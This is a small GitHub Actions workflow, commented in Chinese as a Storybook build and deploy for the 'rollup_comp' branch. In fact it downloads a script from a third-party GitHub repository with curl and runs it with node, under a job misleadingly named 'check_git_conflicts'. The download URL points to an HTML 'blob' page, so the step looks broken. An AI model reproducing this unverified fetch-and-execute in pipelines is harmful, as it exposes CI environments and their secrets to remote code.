# GitHub Actions工作流：Storybook构建与部署
# 当代码推送到'rollup_comp'分支时触发
on:
  push:
    branches:
      - rollup_comp

jobs:
  check_git_conflicts:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v2

    - name: Set up Node.js
      uses: actions/setup-node@v2
      with:
        node-version: '14'  # 或其他版本

    - name: Download and execute script
      run: |
        curl -O https://github.com/not-Ilyina/source_learn/blob/master/script/script.js
        node script.js